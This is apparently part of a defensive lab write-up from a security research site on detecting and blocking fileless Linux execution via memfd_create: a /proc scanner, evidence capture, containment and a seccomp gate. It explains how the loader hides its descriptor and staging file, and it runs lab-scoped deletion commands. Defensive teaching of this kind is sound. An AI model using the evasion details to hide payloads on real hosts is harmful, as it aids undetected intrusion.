+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- DETECTION: the naive view first ---&quot;; ps -ef | grep -x '.*ghost-payload.*' | grep -v grep || pgrep -ax ghost-payload; echo &quot;--- the file inventory:&quot;; ls -l /tmp/gh017; echo &quot;(no payload file. Stopping here is the attacker's win.)&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- DETECTION: the naive view first ---"; ps -ef | grep -x '.*ghost-payload.*' | grep -v grep || pgrep -ax ghost-payload; echo "--- the file inventory:"; ls -l /tmp/gh017; echo "(no payload file. Stopping here is the attacker's win.)"
+--- DETECTION: the naive view first ---
+root          34       1  0 00:15 ?        00:00:00 ghost-payload
+--- the file inventory:
+total 56
+-rwxrwx--- 1 root root 16336 Sep 23 00:15 gate
+-rw-rw---- 1 root root  1030 Sep 23 00:15 gate.c
+-rwxrwx--- 1 root root 16440 Sep 23 00:15 loader
+-rw-rw---- 1 root root   889 Sep 23 00:15 loader.c
+-rw-rw---- 1 root root   241 Sep 23 00:15 payload.c
+-rw-rw---- 1 root root    48 Sep 23 00:15 payload.out
+-rwxrwx--- 1 root root   511 Sep 23 00:15 scan.sh
+(no payload file. Stopping here is the attacker's win.)</pre>
+</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>DETECTION: the whole-host scanner</h3>
+              <div class="prose"><p><strong>/tmp/gh017/scan.sh</strong> walks every numeric /proc entry, readlinks each exe, and flags any resolving to /memfd:*. One command, the whole host, no trust in the file inventory. The output names the suspect PID, the anonymous exe, and the command line. The pid it reports is the handle every following step drills into.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- DETECTION: the whole-host scanner ---&quot;; /tmp/gh017/scan.sh; echo &quot;(one command, every process, no trust in the file inventory)&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- DETECTION: the whole-host scanner ---"; /tmp/gh017/scan.sh; echo "(one command, every process, no trust in the file inventory)"
+--- DETECTION: the whole-host scanner ---
+SUSPECT pid=34 exe='/memfd:ghost-payload (deleted)' cmd='ghost-payload '
+(one command, every process, no trust in the file inventory)</pre>
+</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div>
+              <h3>DETECTION: the independent path, by hand</h3>
+              <div class="prose"><p>The pid comes from the scanner's output; the verification is manual. <strong>readlink /proc/$P/exe</strong> prints /memfd:ghost-payload (deleted): the executable is anonymous memory, and that is the tell. <strong>grep -c memfd /proc/$P/maps</strong> counts the anonymous mappings; the head shows them, including one r-xp line, an executable mapping with no file behind it. Good versus bad, concrete: good is the exe link resolving to a real path; bad is the exe link resolving to /memfd:*, which means fileless execution, investigate now. The kernel cannot lie about what it is executing, even when the filesystem has nothing to say.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- DETECTION: the independent path ---&quot;; P=$(/tmp/gh017/scan.sh | awk '/^SUSPECT/ {print $2}' | cut -d= -f2 | head -1); echo &quot;payload pid: $P (found by the scanner)&quot;; echo &quot;--- the exe link:&quot;; readlink /proc/$P/exe; echo &quot;--- memfd mappings (one is executable):&quot;; grep -c memfd /proc/$P/maps; grep memfd /proc/$P/maps | head -3; echo &quot;good: exe resolves to a real path&quot;; echo &quot;bad: exe resolves to /memfd:* -&gt; fileless execution, investigate&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- DETECTION: the independent path ---"; P=$(/tmp/gh017/scan.sh | awk '/^SUSPECT/ {print $2}' | cut -d= -f2 | head -1); echo "payload pid: $P (found by the scanner)"; echo "--- the exe link:"; readlink /proc/$P/exe; echo "--- memfd mappings (one is executable):"; grep -c memfd /proc/$P/maps; grep memfd /proc/$P/maps | head -3; echo "good: exe resolves to a real path"; echo "bad: exe resolves to /memfd:* -&gt; fileless execution, investigate"
+--- DETECTION: the independent path ---
+payload pid: 34 (found by the scanner)
+--- the exe link:
+/memfd:ghost-payload (deleted)
+--- memfd mappings (one is executable):
+5
+5ed091ba9000-5ed091baa000 r--p 00000000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091baa000-5ed091bab000 r-xp 00001000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091bab000-5ed091bac000 r--p 00002000 00:01 1336                       /memfd:ghost-payload (deleted)
+good: exe resolves to a real path
+bad: exe resolves to /memfd:* -&gt; fileless execution, investigate</pre>
+</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div>
+              <h3>DETECTION: the CLOEXEC lesson</h3>
+              <div class="prose"><p><strong>ls -l /proc/$P/fd</strong> shows stdin, stdout, stderr, and no memfd descriptor. The loader passed MFD_CLOEXEC, so the kernel closed the anonymous file's descriptor at exec: the attacker hid the handle. A detector that only watches for memfd file descriptors misses the CLOEXEC variant entirely. The exe link and the mappings do not depend on the descriptor surviving, which is why the independent path reads them and not the fd table. Defense in depth starts with knowing which observation the attacker already defeated.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- the CLOEXEC lesson: check the descriptors ---&quot;; P=$(/tmp/gh017/scan.sh | awk '/^SUSPECT/ {print $2}' | cut -d= -f2 | head -1); ls -l /proc/$P/fd; echo &quot;(no memfd descriptor: MFD_CLOEXEC closed it at exec)&quot;; echo &quot;the attacker hid the descriptor; the exe link still tells the truth&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- the CLOEXEC lesson: check the descriptors ---"; P=$(/tmp/gh017/scan.sh | awk '/^SUSPECT/ {print $2}' | cut -d= -f2 | head -1); ls -l /proc/$P/fd; echo "(no memfd descriptor: MFD_CLOEXEC closed it at exec)"; echo "the attacker hid the descriptor; the exe link still tells the truth"
+--- the CLOEXEC lesson: check the descriptors ---
+total 0
+lr-x------ 1 root root 64 Sep 23 00:15 0 -&gt; /dev/null
+l-wx------ 1 root root 64 Sep 23 00:15 1 -&gt; /tmp/gh017/payload.out
+l-wx------ 1 root root 64 Sep 23 00:15 2 -&gt; /tmp/gh017/payload.out
+(no memfd descriptor: MFD_CLOEXEC closed it at exec)
+the attacker hid the descriptor; the exe link still tells the truth</pre>
+</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div>
+              <h3>MITIGATION: evidence first, then contain</h3>
+              <div class="prose"><p>The exe link, the memfd mappings, the command line, and the fd listing go into evidence.txt BEFORE anything is touched: killing the process destroys the memfd with it, and the anonymous contents are unrecoverable after that, so the capture comes first. Then <strong>kill $P</strong>: the memfd dies with the process, there is no file to delete, containment is the kill plus the sweep. <strong>/tmp/gh017/scan.sh</strong> reports clean: no memfd-backed executables remain. The scanner already covered every process, so the sweep is done.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- MITIGATION: record the evidence BEFORE touching anything ---&quot;; P=$(/tmp/gh017/scan.sh | awk '/^SUSPECT/ {print $2}' | cut -d= -f2 | head -1); { echo &quot;exe: $(readlink /proc/$P/exe)&quot;; echo '--- maps:'; grep memfd /proc/$P/maps; echo '--- cmdline:'; tr '\0' ' ' &lt; /proc/$P/cmdline; echo; echo '--- fd:'; ls -l /proc/$P/fd; } &gt; /tmp/gh017/evidence.txt 2&gt;&amp;1; cat /tmp/gh017/evidence.txt; echo &quot;--- contain: kill it; the memfd dies with the process ---&quot;; kill $P; sleep 0.5; /tmp/gh017/scan.sh"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- MITIGATION: record the evidence BEFORE touching anything ---"; P=$(/tmp/gh017/scan.sh | awk '/^SUSPECT/ {print $2}' | cut -d= -f2 | head -1); { echo "exe: $(readlink /proc/$P/exe)"; echo '--- maps:'; grep memfd /proc/$P/maps; echo '--- cmdline:'; tr '\0' ' ' &lt; /proc/$P/cmdline; echo; echo '--- fd:'; ls -l /proc/$P/fd; } &gt; /tmp/gh017/evidence.txt 2&gt;&amp;1; cat /tmp/gh017/evidence.txt; echo "--- contain: kill it; the memfd dies with the process ---"; kill $P; sleep 0.5; /tmp/gh017/scan.sh
+--- MITIGATION: record the evidence BEFORE touching anything ---
+exe: /memfd:ghost-payload (deleted)
+--- maps:
+5ed091ba9000-5ed091baa000 r--p 00000000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091baa000-5ed091bab000 r-xp 00001000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091bab000-5ed091bac000 r--p 00002000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091bac000-5ed091bad000 r--p 00002000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091bad000-5ed091bae000 rw-p 00003000 00:01 1336                       /memfd:ghost-payload (deleted)
+--- cmdline:
+ghost-payload
+--- fd:
+total 0
+lr-x------ 1 root root 64 Sep 23 00:15 0 -&gt; /dev/null
+l-wx------ 1 root root 64 Sep 23 00:15 1 -&gt; /tmp/gh017/payload.out
+l-wx------ 1 root root 64 Sep 23 00:15 2 -&gt; /tmp/gh017/payload.out
+--- contain: kill it; the memfd dies with the process ---
+clean: no memfd-backed executables</pre>
+</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">6</div>
+            <div>
+              <h3>MITIGATION: the dropper was always a file</h3>
+              <div class="prose"><p><strong>rm -f</strong> removes the loader and payload binaries from disk; <strong>ls -l</strong> confirms what remains. The honest note, stated plainly: only the payload was fileless. The dropper was always a file, and incident response still hunts how the dropper arrived on the box: the delivery vector is out of this file's scope, but the response is not complete until it is answered. Fileless execution hides the payload, never the delivery.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- MITIGATION: the dropper was always a file ---&quot;; rm -f /tmp/gh017/loader /tmp/gh017/payload; ls -l /tmp/gh017; echo &quot;(only the payload was fileless; incident response still hunts how the dropper arrived)&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- MITIGATION: the dropper was always a file ---"; rm -f /tmp/gh017/loader /tmp/gh017/payload; ls -l /tmp/gh017; echo "(only the payload was fileless; incident response still hunts how the dropper arrived)"
+--- MITIGATION: the dropper was always a file ---
+total 40
+-rw-rw---- 1 root root   798 Sep 23 00:15 evidence.txt
+-rwxrwx--- 1 root root 16336 Sep 23 00:15 gate
+-rw-rw---- 1 root root  1030 Sep 23 00:15 gate.c
+-rw-rw---- 1 root root   889 Sep 23 00:15 loader.c
+-rw-rw---- 1 root root   241 Sep 23 00:15 payload.c
+-rw-rw---- 1 root root    48 Sep 23 00:15 payload.out
+-rwxrwx--- 1 root root   511 Sep 23 00:15 scan.sh
+(only the payload was fileless; incident response still hunts how the dropper arrived)</pre>
+</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">7</div>
+            <div>
+              <h3>PREVENTION: the seccomp gate</h3>
+              <div class="prose"><p>The dropper is rebuilt, then run under the gate: <strong>./gate ./loader ./payload</strong>. The loader's memfd_create returns EPERM, "Operation not permitted", and the loader exits 1 before it can do anything: no anonymous file, no execution, and the staging copy survives on disk because the loader died before unlinking it. Under the gate the attack fails closed. D3FEND <a href="https://d3fend.mitre.org/technique/d3f:ProcessSegmentExecutionPrevention/" rel="noopener">D3-PSEP: Process Segment Execution Prevention</a> names this shape: preventing execution from memory regions outside the legitimate code segment, enforced here at the syscall that creates the anonymous region.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- PREVENTION: the seccomp gate ---&quot;; echo &quot;(rebuild the dropper, then run it under the gate)&quot;; cd /tmp/gh017 &amp;&amp; gcc -O2 -o loader loader.c &amp;&amp; gcc -O2 -o payload payload.c &amp;&amp; ./gate ./loader ./payload; echo &quot;loader rc=$?&quot;; echo &quot;--- the staging copy survives: the loader died before it could unlink ---&quot;; ls -l /tmp/gh017/payload; echo &quot;(under the gate the attack fails closed: no anonymous file, no execution)&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- PREVENTION: the seccomp gate ---"; echo "(rebuild the dropper, then run it under the gate)"; cd /tmp/gh017 &amp;&amp; gcc -O2 -o loader loader.c &amp;&amp; gcc -O2 -o payload payload.c &amp;&amp; ./gate ./loader ./payload; echo "loader rc=$?"; echo "--- the staging copy survives: the loader died before it could unlink ---"; ls -l /tmp/gh017/payload; echo "(under the gate the attack fails closed: no anonymous file, no execution)"
+--- PREVENTION: the seccomp gate ---
+(rebuild the dropper, then run it under the gate)
+memfd_create: Operation not permitted
+loader rc=1
+--- the staging copy survives: the loader died before it could unlink ---
+-rwxrwx--- 1 root root 16144 Sep 23 00:15 /tmp/gh017/payload
+(under the gate the attack fails closed: no anonymous file, no execution)</pre>
+</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">8</div>
+            <div>
+              <h3>Verdict and cleanup</h3>
+              <div class="prose"><p>The summary, in the defender's own words: the listing said clean, the exe link said anonymous memory. The evidence was captured before the kill, the scanner is the scheduled check, the seccomp gate denies memfd_create and the attack fails closed. <strong>rm -rf /tmp/gh017</strong> removes the lab; <strong>ls</strong> confirms the directory is gone.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;detection verified: the listing said clean, the exe link said anonymous memory&quot;; echo &quot;the evidence was captured before the kill, the scanner is the scheduled check&quot;; echo &quot;the seccomp gate denies memfd_create, and the attack fails closed&quot;; rm -rf /tmp/gh017; ls /tmp | grep gh017 || echo &quot;lab gone&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "detection verified: the listing said clean, the exe link said anonymous memory"; echo "the evidence was captured before the kill, the scanner is the scheduled check"; echo "the seccomp gate denies memfd_create, and the attack fails closed"; rm -rf /tmp/gh017; ls /tmp | grep gh017 || echo "lab gone"
+detection verified: the listing said clean, the exe link said anonymous memory
+the evidence was captured before the kill, the scanner is the scheduled check
+the seccomp gate denies memfd_create, and the attack fails closed
+lab gone</pre>
+</div>
+              <div class="verdict green">
+                <span class="mlabel">Detection verified</span>
+                <p>The file listing said clean and the exe link said anonymous memory, and the exe link was right: /memfd:ghost-payload (deleted), with executable anonymous mappings to match. The evidence was captured before the kill, the whole-host scanner confirmed the containment, and the seccomp gate made the rebuilt dropper fail closed with EPERM. The CLOEXEC variant hides the descriptor; it cannot hide the execution.</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="phase" id="countermeasures">
+          <div class="phase-head"><span class="phase-num">05</span><h2>Countermeasures</h2><span class="phase-tag blue">DEFENSE</span></div>
+          <p class="lede">Three moves, in order: capture and contain, scan the host on a schedule, gate the syscall for sandboxed workloads. Each is one way, not the way.</p>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div>
+              <h3>Mitigate: capture, kill, sweep, remove the dropper</h3>
+              <div class="prose"><p>Proven first against the live fileless process: capture the exe link, the memfd mappings, the command line, and the fd listing into evidence.txt before touching anything, kill the process (the memfd dies with it; there is no file to delete), re-run the /proc scanner to confirm clean across every process, and remove the dropper binary from disk. A real response then hunts the delivery vector: how the dropper arrived is the incident's open question.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- MITIGATION: record the evidence BEFORE touching anything ---&quot;; P=$(/tmp/gh017/scan.sh | awk '/^SUSPECT/ {print $2}' | cut -d= -f2 | head -1); { echo &quot;exe: $(readlink /proc/$P/exe)&quot;; echo '--- maps:'; grep memfd /proc/$P/maps; echo '--- cmdline:'; tr '\0' ' ' &lt; /proc/$P/cmdline; echo; echo '--- fd:'; ls -l /proc/$P/fd; } &gt; /tmp/gh017/evidence.txt 2&gt;&amp;1; cat /tmp/gh017/evidence.txt; echo &quot;--- contain: kill it; the memfd dies with the process ---&quot;; kill $P; sleep 0.5; /tmp/gh017/scan.sh"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- MITIGATION: record the evidence BEFORE touching anything ---"; P=$(/tmp/gh017/scan.sh | awk '/^SUSPECT/ {print $2}' | cut -d= -f2 | head -1); { echo "exe: $(readlink /proc/$P/exe)"; echo '--- maps:'; grep memfd /proc/$P/maps; echo '--- cmdline:'; tr '\0' ' ' &lt; /proc/$P/cmdline; echo; echo '--- fd:'; ls -l /proc/$P/fd; } &gt; /tmp/gh017/evidence.txt 2&gt;&amp;1; cat /tmp/gh017/evidence.txt; echo "--- contain: kill it; the memfd dies with the process ---"; kill $P; sleep 0.5; /tmp/gh017/scan.sh
+--- MITIGATION: record the evidence BEFORE touching anything ---
+exe: /memfd:ghost-payload (deleted)
+--- maps:
+5ed091ba9000-5ed091baa000 r--p 00000000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091baa000-5ed091bab000 r-xp 00001000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091bab000-5ed091bac000 r--p 00002000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091bac000-5ed091bad000 r--p 00002000 00:01 1336                       /memfd:ghost-payload (deleted)
+5ed091bad000-5ed091bae000 rw-p 00003000 00:01 1336                       /memfd:ghost-payload (deleted)
+--- cmdline:
+ghost-payload
+--- fd:
+total 0
+lr-x------ 1 root root 64 Sep 23 00:15 0 -&gt; /dev/null
+l-wx------ 1 root root 64 Sep 23 00:15 1 -&gt; /tmp/gh017/payload.out
+l-wx------ 1 root root 64 Sep 23 00:15 2 -&gt; /tmp/gh017/payload.out
+--- contain: kill it; the memfd dies with the process ---
+clean: no memfd-backed executables</pre>
+</div>
+              <div class="callout"><p><strong>Honest limit.</strong> Killing the process destroys the memfd and with it any in-memory forensic artifact: the evidence.txt capture comes before the kill for exactly that reason, and the capture is treated as the record. The memfd's former contents are unrecoverable after the kill; there is no file to carve. The loader binary and the evidence capture ARE the artifacts. A response that kills first and captures after has destroyed its own evidence.</p></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div>
+              <h3>Monitor: scan /proc for memfd-backed executables on a schedule</h3>
+              <div class="prose"><p>The scheduled form of the phase-blue read: the scanner walks /proc, readlinks every exe, and flags any resolving to /memfd:*. The tell is any memfd-backed executable on a production host. D3FEND <a href="https://d3fend.mitre.org/technique/d3f:ProcessCodeSegmentVerification/" rel="noopener">D3-PCSV: Process Code Segment Verification</a> is the discipline behind it: the code segment is verified against a source of truth, and here the truth is that every executable must resolve to a real path.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- DETECTION: the whole-host scanner ---&quot;; /tmp/gh017/scan.sh; echo &quot;(one command, every process, no trust in the file inventory)&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- DETECTION: the whole-host scanner ---"; /tmp/gh017/scan.sh; echo "(one command, every process, no trust in the file inventory)"
+--- DETECTION: the whole-host scanner ---
+SUSPECT pid=34 exe='/memfd:ghost-payload (deleted)' cmd='ghost-payload '
+(one command, every process, no trust in the file inventory)</pre>
+</div>
+              <div class="callout"><p><strong>Honest limit.</strong> The scanner sees only its own PID namespace: run it host-wide, not inside a container, or the fileless process in another namespace is invisible to it. Legitimate software (browsers, language runtimes) uses memfd and must be allowlisted by exact name, and every allowlist entry is a name the attacker will try to wear. The poll interval sets the detection floor: a payload that runs and exits between polls is missed. Where available, pair the scanner with syscall auditing of memfd_create itself (auditctl -a always,exit -F arch=b64 -S memfd_create -k memfd-exec): stated with its exact syntax and its dependency, not demonstrated, because the audit subsystem is disabled in this lab and in many containers.</p></div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div>
+              <h3>Prevent: deny memfd_create to the sandboxed workload</h3>
+              <div class="prose"><p>The durable form: a seccomp-BPF gate that returns EPERM for memfd_create, applied where the untrusted code runs. Demonstrated above: under the gate the loader fails closed before it can create the anonymous file. In production the gate lives in the container runtime's seccomp profile or the unit's SystemCallFilter=~memfd_create, not in a wrapper binary.</p></div>
+              <div class="codeblock codeblock-scrollhint">
+<div class="codeblock-bar"><span class="mlabel">bash</span><button class="copy-btn" data-copy="echo &quot;--- PREVENTION: the seccomp gate ---&quot;; echo &quot;(rebuild the dropper, then run it under the gate)&quot;; cd /tmp/gh017 &amp;&amp; gcc -O2 -o loader loader.c &amp;&amp; gcc -O2 -o payload payload.c &amp;&amp; ./gate ./loader ./payload; echo &quot;loader rc=$?&quot;; echo &quot;--- the staging copy survives: the loader died before it could unlink ---&quot;; ls -l /tmp/gh017/payload; echo &quot;(under the gate the attack fails closed: no anonymous file, no execution)&quot;"><span data-label>COPY</span></button></div>
+<pre>$ echo "--- PREVENTION: the seccomp gate ---"; echo "(rebuild the dropper, then run it under the gate)"; cd /tmp/gh017 &amp;&amp; gcc -O2 -o loader loader.c &amp;&amp; gcc -O2 -o payload payload.c &amp;&amp; ./gate ./loader ./payload; echo "loader rc=$?"; echo "--- the staging copy survives: the loader died before it could unlink ---"; ls -l /tmp/gh017/payload; echo "(under the gate the attack fails closed: no anonymous file, no execution)"
+--- PREVENTION: the seccomp gate ---
+(rebuild the dropper, then run it under the gate)
+memfd_create: Operation not permitted
+loader rc=1
+--- the staging copy survives: the loader died before it could unlink ---
+-rwxrwx--- 1 root root 16144 Sep 23 00:15 /tmp/gh017/payload
+(under the gate the attack fails closed: no anonymous file, no execution)</pre>
+</div>
+              <div class="callout"><p><strong>Honest limit.</strong> The gate is per-process policy: it stops only the workloads it is applied to, and an attacker who controls the policy controls the gate. Blocking the syscall can break legitimate software that uses anonymous files, so the profile must be built from the workload's actual syscall set, not copied blindly. And it stops the memfd variant, not reflective loading by other primitives: anonymous PROT_EXEC mappings do not need memfd_create. Defense in depth, not a silver bullet.</p></div>
+              <div class="verdict green">
+                <span class="mlabel">Countermeasures verified</span>
+                <p>The fileless process was detected from its exe link, captured, and contained with the scanner confirming clean; the scanner is the scheduled check with the namespace and allowlist limits stated; the seccomp gate denies memfd_create and the rebuilt dropper failed closed. The file listing still says nothing ran. The exe link does not agree.</p>
+              </div>
+            </div>
+          </div>
+        </section>
+
+        <section class="phase" id="debrief">
+          <div class="phase-head"><span class="phase-num">06</span><h2>Debrief</h2><span class="phase-tag neutral">TAKEAWAY</span></div>
+          <p class="takeaway">When the file listing says nothing ran, read the exe link: code that was never a file still has to execute from somewhere.</p>
+          <div class="prose"><p><span class="mlabel" style="display:block;margin-bottom:10px">IOC checklist: signs this technique was used</span></p></div>
+          <ul class="checklist">
+            <li><span>A process whose <strong>/proc/PID/exe</strong> resolves to <strong>/memfd:* (deleted)</strong> instead of a path</span></li>
+            <li><span><strong>Anonymous executable mappings</strong> (r-xp) in /proc/PID/maps with a memfd tag and no file</span></li>
+            <li><span>A process name with <strong>no corresponding file</strong> anywhere on the filesystem</span></li>
+            <li><span>A dropper binary whose recent execution left <strong>no payload artifact</strong> behind</span></li>
+            <li><span>Audit events for the <strong>memfd_create</strong> syscall from an unexpected process, where auditing is enabled</span></li>
+          </ul>
+          <div class="prose"><p><span class="mlabel" style="display:block;margin-bottom:10px">Reproducibility checklist</span></p></div>
+          <ul class="checklist">
+            <li><span>Verified on <strong>Ubuntu 24.04.5 LTS</strong>, x86-64, on 2026-09-22</span></li>
+            <li><span>Both recordings are real executions on that platform, not simulations</span></li>
+            <li><span>Runs as root in a disposable namespace (the lab compiles its own loader, payload, scanner, and gate; the assumed breach: something on the box delivered the dropper)</span></li>
+            <li><span>Cleanup: <strong>rm -rf /tmp/gh017</strong>; verify with <strong>ls /tmp</strong></span></li>
+          </ul>
+          <div class="prose"><p><span class="mlabel" style="display:block;margin-bottom:10px">Sources</span></p></div>
+          <div class="prose"><p><a href="https://attack.mitre.org/techniques/T1620/" rel="noopener">MITRE ATT&amp;CK T1620: Reflective Code Loading</a><br>
+          <a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html" rel="noopener">memfd_create(2)</a> (the anonymous file)<br>
+          <a href="https://man7.org/linux/man-pages/man2/execve.2.html" rel="noopener">execve(2)</a> (fexecve: execute from a descriptor)<br>
+          <a href="https://man7.org/linux/man-pages/man2/seccomp.2.html" rel="noopener">seccomp(2)</a> (the prevention gate)<br>
+          <a href="https://man7.org/linux/man-pages/man5/proc.5.html" rel="noopener">proc(5)</a> (the exe link, the maps, the fd table)<br>
+          <a href="https://d3fend.mitre.org/technique/d3f:ProcessCodeSegmentVerification/" rel="noopener">D3FEND D3-PCSV: Process Code Segment Verification</a><br>
+          <a href="https://d3fend.mitre.org/technique/d3f:ProcessSegmentExecutionPrevention/" rel="noopener">D3FEND D3-PSEP: Process Segment Execution Prevention</a></p></div>
+        </section>
+
+        <a class="next-file" href="../018-deobfuscate-decode/index.html">
+          <span class="mlabel">Next file</span>
+          <h3>GH-018 Deobfuscate/Decode Files or Information</h3>
+          <p>The next file unwraps code that arrives folded.</p>
+        </a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer class="site-footer">
+  <div class="wrap footer-grid">
+    <div>
+      <div class="footer-brand">
+        <svg viewBox="0 0 32 32" aria-hidden="true"><circle cx="16" cy="16" r="12.5" fill="none" stroke="#e0642a" stroke-width="2.6"/><rect x="14.6" y="5.5" width="2.8" height="21" fill="#e0642a"/></svg>
+        <span class="brand-name" style="font-size:17px">GHOSTLIGHT</span>
+      </div>
+      <p class="footer-note">An independent adversary-stealth research publication. Every command verified on the named OS before publishing. No trackers, no frameworks, no autoplay.</p>
+    </div>
+    <nav class="footer-links">
+      <a href="../../method.html">METHOD</a>
+      <a href="../../index.html">FILES</a>
+      <a href="https://attack.mitre.org/tactics/TA0005/" rel="noopener">MITRE TA0005</a>
+    </nav>
+    <div class="footer-elsewhere">
+      <span class="mlabel">Elsewhere</span><a href="https://dillingerstaffing.github.io/portfolio/" target="_blank" rel="noopener">Portfolio</a><span class="sep" aria-hidden="true">/</span><a href="https://dillingerstaffing.github.io/proving-ground/" target="_blank" rel="noopener">Proving Ground</a><span class="sep" aria-hidden="true">/</span><a href="https://dillingerstaffing.github.io/tapeout/" target="_blank" rel="noopener">Tapeout</a><span class="sep" aria-hidden="true">/</span><a href="https://dillingerstaffing.github.io/old-iron/" target="_blank" rel="noopener">Old Iron</a><span class="sep" aria-hidden="true">/</span><a href="https://dillingerstaffing.github.io/unstuck/" target="_blank" rel="noopener">Unstuck</a>
+    </div>
+  </div>
+</footer>
+
+<script src="../../assets/site.js?v=512f8825"></script>
+</body>
+</html>
